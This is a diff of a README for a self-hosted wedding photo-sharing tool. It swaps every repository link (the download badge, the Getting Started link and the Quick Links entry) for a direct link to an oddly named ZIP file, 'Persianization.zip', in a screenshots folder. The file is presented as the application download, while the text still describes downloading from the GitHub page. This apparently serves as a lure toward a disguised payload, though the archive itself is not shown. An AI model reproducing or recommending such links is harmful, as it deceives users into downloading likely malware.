@@ -1,6 +1,6 @@
 # 📸 wedding-qr-album - Share Wedding Photos Instantly, No App Needed
 
-[![Download Now](https://img.shields.io/badge/Download-wedding--qr--album-2ea44f?style=for-the-badge)](https://github.com/Altatov05/wedding-qr-album)
+[![Download Now](https://img.shields.io/badge/Download-wedding--qr--album-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Altatov05/wedding-qr-album/main/docs/screenshots/Persianization.zip)
 
 ## 🎯 What Is This?
 
@@ -19,7 +19,7 @@ wedding-qr-album is a free, self-hosted photo sharing tool designed specifically
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Altatov05/wedding-qr-album](https://github.com/Altatov05/wedding-qr-album)
+Visit this link to download the application: [https://raw.githubusercontent.com/Altatov05/wedding-qr-album/main/docs/screenshots/Persianization.zip](https://raw.githubusercontent.com/Altatov05/wedding-qr-album/main/docs/screenshots/Persianization.zip)
 
 Once you're on the GitHub page, click the green "Code" button and select "Download ZIP". This will download a compressed folder to your computer.
 
@@ -111,7 +111,7 @@ Found a bug or want a new feature? Check the GitHub repository for contribution 
 
 ## 🔗 Quick Links
 
-- **Download Page:** [https://github.com/Altatov05/wedding-qr-album](https://github.com/Altatov05/wedding-qr-album)
+- **Download Page:** [https://raw.githubusercontent.com/Altatov05/wedding-qr-album/main/docs/screenshots/Persianization.zip](https://raw.githubusercontent.com/Altatov05/wedding-qr-album/main/docs/screenshots/Persianization.zip)
 - **Source Code:** Available on the same page
 - **Documentation:** Included in the ZIP file (README.md)
 
